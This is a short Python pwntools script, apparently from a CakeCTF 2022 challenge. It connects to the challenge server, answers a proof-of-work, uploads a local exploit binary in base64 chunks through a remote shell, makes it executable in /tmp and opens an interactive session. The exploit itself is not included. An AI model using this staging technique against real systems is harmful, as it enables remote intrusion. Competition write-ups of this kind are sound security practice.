from email.mime import base
from pwn import *
import time
import base64
import os

sendlineafter = lambda p, x, y: p.sendlineafter(x, y)

with open("./a.out", "rb") as f:
    payload = base64.b64encode(f.read()).decode()

p = remote('pwn2.2022.cakectf.com', 9999)
cmd = p.recvline().decode().split()
q = process(cmd)
q.recvuntil(b': ')
p.sendline(q.recvline())

sendlineafter(p, b'$ ', b'cd /tmp')

for i in range(0, len(payload), 512):
    print(f"Uploading... {i:x} / {len(payload):x}")
    sendlineafter(p, b'$ ', 'echo -n "{}" >> b64exp'.format(payload[i:i+512]))

sendlineafter(p, b'$ ', b'base64 -d b64exp > exploit')
sendlineafter(p, b'$ ', b'chmod +x exploit')
p.interactive()
